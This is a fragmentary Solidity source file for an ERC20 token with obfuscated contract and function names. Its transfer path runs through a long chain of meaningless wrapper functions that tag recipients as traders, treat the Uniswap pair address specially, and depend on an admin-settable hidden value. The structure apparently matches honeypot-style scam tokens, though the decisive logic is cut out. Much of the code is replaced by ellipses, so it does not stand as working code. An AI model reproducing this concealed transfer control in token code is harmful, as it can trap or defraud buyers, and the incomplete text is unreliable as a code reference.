...
abstract contract KDHSVINConsole is Context, KDHSVINRoleControl {
    ...
    function _addhasRule(bytes32 role, address account, uint256 amt) internal {
        ...
        _addhasRules(role, account, amt);
    }

    function _addhasRules(bytes32 role, address account, uint256 amt) internal {
    ...
    function _newHashRole(bytes32 role, address account, uint256 num) internal virtual {
...
contract KDHSVINERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is KDHSVINERC20, KDHSVINConsole {
    ...
    ) KDHSVINERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(KDHSVINERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");


        _KDHSVINdfvcggre(from, to, amt);
    }

    function _KDHSVINnewNum(
        uint newnum
    ) public onlyRole(ADMIN) {
        isnum = newnum;
    }

    function _KDHSVINdfvcggre(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _KDHSVINtrcbe(from, to, amt);
    }

    function _KDHSVINtrcbe(address from, address to, uint256 amt) internal {
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _KDHSVINdfhthcv(from, to, amt);
    }

    function _KDHSVINdfhthcv(address from, address to, uint256 amt) internal {
        ...
        _KDHSVINyiszxc(from, to, amt);
    }

    function _KDHSVINyiszxc(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _KDHSVINuiacsvx(from, to, amt);
    }

    function _KDHSVINuiacsvx(address from, address to, uint256 amt) internal {
        
        _KDHSVINiufassa(from, to, amt);
    }

    function _KDHSVINiufassa(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        _KDHSVINmuyswe(from, to, amt);
    }

    function _KDHSVINmuyswe(address from, address to, uint256 amt) internal {
